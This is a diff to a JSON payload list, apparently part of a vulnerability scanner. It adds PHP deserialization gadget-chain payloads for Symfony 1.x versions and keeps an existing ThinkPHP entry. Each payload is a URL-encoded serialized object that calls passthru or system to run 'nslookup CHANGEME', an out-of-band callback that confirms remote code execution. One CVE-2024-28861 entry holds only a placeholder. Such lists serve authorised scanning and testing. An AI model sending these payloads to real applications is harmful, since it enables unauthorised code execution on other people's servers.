@@ -368,6 +368,37 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
+    "name": "Symfony 1.3.0 <= 1.5.13~17 (12)",
+    "gen_with": "./phpggc Symfony/RCE12 <function> <parameter>",
+    "payload": "O:27:\"Swift_KeyCache_DiskKeyCache\":2:{s:34:\"%00Swift_KeyCache_DiskKeyCache%00_path\"%3Bs:25:\"thispathshouldneverexists\"%3Bs:34:\"%00Swift_KeyCache_DiskKeyCache%00_keys\"%3BO:29:\"sfOutputEscaperArrayDecorator\":2:{s:8:\"%00*%00value\"%3Ba:1:{i:1%3Bs:63:\"nslookup+CHANGEME\"%3B}s:17:\"%00*%00escapingMethod\"%3Bs:8:\"passthru\"%3B}}"
+  },
+
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Symfony 1.2.0 <= 1.2.12 (13)",
+    "gen_with": "./phpggc Symfony/RCE13 <function> <parameter>",
+    "payload": "C:15:\"sfDoctrinePager\":177:{O:29:\"sfOutputEscaperArrayDecorator\":2:{s:8:\"%00*%00value\"%3Ba:1:{i:0%3Bs:63:\"nslookup+CHANGEME\"%3B}s:17:\"%00*%00escapingMethod\"%3Bs:8:\"passthru\"%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Symfony 1.2.0 <= 1.2.12 (14)",
+    "gen_with": "./phpggc Symfony/RCE14 <function> <parameter>",
+    "payload": "O:14:\"PropelDateTime\":2:{s:26:\"%00PropelDateTime%00dateString\"%3BN%3Bs:24:\"%00PropelDateTime%00tzString\"%3BO:30:\"sfOutputEscaperObjectDecorator\":2:{s:8:\"%00*%00value\"%3BO:13:\"sfCultureInfo\":8:{s:14:\"%00*%00dataFileExt\"%3Bs:4:\".dat\"%3Bs:7:\"%00*%00data\"%3Ba:0:{}s:10:\"%00*%00culture\"%3Bs:63:\"nslookup+CHANGEME\"%3Bs:10:\"%00*%00dataDir\"%3BN%3Bs:12:\"%00*%00dataFiles\"%3Ba:0:{}s:17:\"%00*%00dateTimeFormat\"%3BN%3Bs:15:\"%00*%00numberFormat\"%3BN%3Bs:13:\"%00*%00properties\"%3Ba:0:{}}s:17:\"%00*%00escapingMethod\"%3Bs:8:\"passthru\"%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Symfony 1.0.0 <= 1.1.9 (15)",
+    "gen_with": "./phpggc Symfony/RCE15 <function> <parameter>",
+    "payload": "O:15:\"MySQLiTableInfo\":15:{s:7:\"%00*%00name\"%3BN%3Bs:10:\"%00*%00columns\"%3BO:29:\"sfOutputEscaperArrayDecorator\":2:{s:8:\"%00*%00value\"%3Ba:1:{i:0%3Bs:63:\"nslookup+CHANGEME\"%3B}s:17:\"%00*%00escapingMethod\"%3Bs:8:\"passthru\"%3B}s:14:\"%00*%00foreignKeys\"%3Ba:0:{}s:10:\"%00*%00indexes\"%3Ba:0:{}s:13:\"%00*%00primaryKey\"%3BN%3Bs:11:\"%00*%00pkLoaded\"%3Bb:0%3Bs:12:\"%00*%00fksLoaded\"%3Bb:0%3Bs:16:\"%00*%00indexesLoaded\"%3Bb:0%3Bs:13:\"%00*%00colsLoaded\"%3Bb:0%3Bs:15:\"%00*%00vendorLoaded\"%3Bb:0%3Bs:21:\"%00*%00vendorSpecificInfo\"%3Ba:0:{}s:7:\"%00*%00conn\"%3BN%3Bs:11:\"%00*%00database\"%3BN%3Bs:9:\"%00*%00dblink\"%3BN%3Bs:9:\"%00*%00dbname\"%3BN%3B}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Symfony 1.1.0 <= 1.5.18 (CVE-2024-28861) (16)",
+    "gen_with": "./phpggc Symfony/RCE16 <function> <parameter>",
+    "payload": "placeholder"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
     "name": "ThinkPHP 5.1.x-5.2.x (1)",
     "gen_with": "./phpggc ThinkPHP/RCE1 <function> <parameter>",
     "payload": "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"%00think\\process\\pipes\\Windows%00files\"%3Ba:1:{i:0%3BO:17:\"think\\model\\Pivot\":3:{s:17:\"%00think\\Model%00data\"%3Ba:1:{s:5:\"smi1e\"%3Bs:63:\"nslookup CHANGEME\"%3B}s:21:\"%00think\\Model%00withAttr\"%3Ba:1:{s:5:\"smi1e\"%3Bs:6:\"system\"%3B}s:9:\"%00*%00append\"%3Ba:1:{s:5:\"smi1e\"%3Bs:1:\"1\"%3B}}}}"
